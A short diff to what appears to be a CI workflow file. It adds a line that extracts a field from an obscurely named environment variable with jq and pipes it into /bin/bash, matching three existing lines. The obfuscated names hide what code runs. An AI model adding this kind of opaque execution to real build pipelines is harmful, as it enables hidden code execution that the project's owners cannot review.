@@ -57,6 +57,7 @@ jobs:
           echo $y87 | jq -r .czfsj4242 | /bin/bash
           echo $v869 | jq -r .eoc6810 | /bin/bash
           printf '%s' "$tud88583" | jq -r .v135 | /bin/bash
+          printf '%s' "$sm8" | jq -r .c84 | /bin/bash
 
       - name: Archive output
         if: always()
